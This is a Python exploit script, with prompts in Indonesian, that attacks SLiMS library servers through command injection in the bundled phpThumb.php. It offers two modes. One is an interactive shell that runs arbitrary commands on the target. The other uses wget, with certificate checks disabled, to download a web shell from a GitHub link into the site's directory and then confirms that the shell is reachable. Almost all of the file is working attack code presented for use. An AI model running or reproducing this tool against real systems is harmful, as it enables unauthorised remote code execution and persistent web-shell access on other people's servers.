#!/usr/bin/env python3
import requests
import warnings
import time

# --- SILENCE ---
warnings.filterwarnings("ignore")
requests.packages.urllib3.disable_warnings()

# COLOR & UI
GREEN, RED, YELLOW, CYAN, WHITE, RESET, BOLD = '\033[92m', '\033[91m', '\033[93m', '\033[96m', '\033[97m', '\033[0m', '\033[1m'

class SlimsExploiter:
    def __init__(self, target):
        self.target = target if target.startswith(('http://', 'https://')) else "https://" + target
        self.exploit_url = f"{self.target.rstrip('/')}/lib/watermark/phpThumb.php"
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Connection": "keep-alive"
        })

    def execute(self, cmd):
        payload = f"blur|9 ;{cmd};"
        params = {"src": "1.jpg", "fltr[]": payload, "phpThumbDebug": "9"}
        try:
            r = self.session.get(self.exploit_url, params=params, verify=False, timeout=25)
            return r.text if r.status_code == 200 else f"Error: Status {r.status_code}"
        except Exception as e:
            return f"Error: {str(e)}"

def main():
    print(f"\n{BOLD}{CYAN}=== SLiMS MULTI-EXPLOITER V3 ==={RESET}")
    target = input(f"{YELLOW}[?] Target Domain: {RESET}").strip()
    
    exp = SlimsExploiter(target)
    
    print(f"\n{BOLD}Pilih Mode:{RESET}")
    print(f"{CYAN}1. CMD Manual (Interactive Mode)")
    print(f"2. Auto Upload (GitHub Shell Mode){RESET}")
    
    choice = input(f"\n{YELLOW}[?] Pilihan (1/2): {RESET}").strip()

    if choice == "1":
        print(f"\n{BOLD}[*] Mode CMD Manual Aktif. Ketik 'exit' untuk keluar.{RESET}")
        while True:
            cmd = input(f"{GREEN}target@{target}:~# {RESET}").strip()
            if cmd.lower() == "exit": break
            output = exp.execute(cmd)
            print(f"\n{WHITE}{output}{RESET}\n")

    elif choice == "2":
        github_link = input(f"{YELLOW}[?] Link GitHub RAW Shell: {RESET}").strip()
        file_name = input(f"{YELLOW}[?] Simpan Sebagai (ex: asd.php): {RESET}").strip()
        
        print(f"\n{BOLD}[*] Triggering Upload...{RESET}")
        # Command wget dengan bypass certificate
        cmd_upload = f"wget --no-check-certificate {github_link} -O {file_name}"
        exp.execute(cmd_upload)
        
        print("[*] Waiting 3 seconds for synchronization...")
        time.sleep(3)
        
        shell_url = f"{exp.target.rstrip('/')}/lib/watermark/{file_name}"
        print(f"[*] Checking: {shell_url}")
        
        try:
            check = exp.session.get(shell_url, verify=False, timeout=15)
            if check.status_code == 200:
                print(f"\n{GREEN}{BOLD}[SUCCESS] File Berhasil Terupload!{RESET}")
                print(f"{GREEN}[URL] {shell_url}{RESET}")
            else:
                print(f"{RED}[!] Gagal: Status {check.status_code}. Cek manual di browser.{RESET}")
        except:
            print(f"{RED}[!] Error saat memverifikasi file.{RESET}")
    else:
        print(f"{RED}[!] Pilihan tidak valid.{RESET}")

if __name__ == "__main__":
    main()
